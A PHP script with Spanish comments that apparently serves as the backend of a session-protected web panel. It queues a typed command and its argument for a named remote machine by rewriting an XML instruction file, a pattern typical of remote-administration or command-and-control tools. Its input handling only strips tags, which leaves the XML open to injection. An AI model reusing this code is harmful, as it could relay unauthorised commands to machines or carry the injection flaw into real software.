<?php
	header("Cache-Control: no-store, no-cache, must-revalidate");
	function filtrar($variable)
	{
		return mysql_real_escape_string(strip_tags($variable));
	}

	//Comprobamos que existe una sesión y tiene la variable conectado, si no, redirige a la página principal
	session_start();
	if(empty($_SESSION['conectado']))
	{
	   header ("Location: index.php");
	   exit;
	}
	error_reporting(0);
	
	$com = strip_tags($_POST['commands']);
	$com = str_replace(array('"'),array('\''),$com);
	$xml = simplexml_load_file('wee.xml');
	foreach ($xml->version as $version)
	{
		$numVersion = (int) $version['num'];
	}
	$numVersion++;
	$xmlContent="<?xml version=\"1.0\"?>\r\n<instructions>\r\n<version num=\"" . $numVersion . "\" />\r\n";
	$id = mt_rand(1,32000);
	
	$maquina = filtrar($_GET['maquina']);
	$_SESSION['id_comando'] = $id;
	$_SESSION['maquina'] = $maquina;
	if (stristr($com, ' ') === FALSE)
	{
		$xmlContent=$xmlContent . "<instruction type=\"" . $com . "\" argumento=\"\" id_unico_comando=\"".$id."\" maquina=\"".$maquina."\"/>\r\n";
	}
	else
	{
		$xmlContent=$xmlContent . "<instruction type=\"" . substr($com, 0, strpos($com, " ")) . "\" argumento=\"" . substr(strstr($com, ' '),1) . "\" id_unico_comando=\"".$id."\" maquina=\"".$maquina."\"/>\r\n";
	}
	$xmlContent = $xmlContent . "</instructions>";
	$fp = fopen('wee.xml',"w+");
	fputs($fp, $xmlContent); 
	fclose($fp);

	//Mostramos el ultimo comando
	echo "<br/>>". $com;
	$_SESSION['id_comando'] = $id;
?>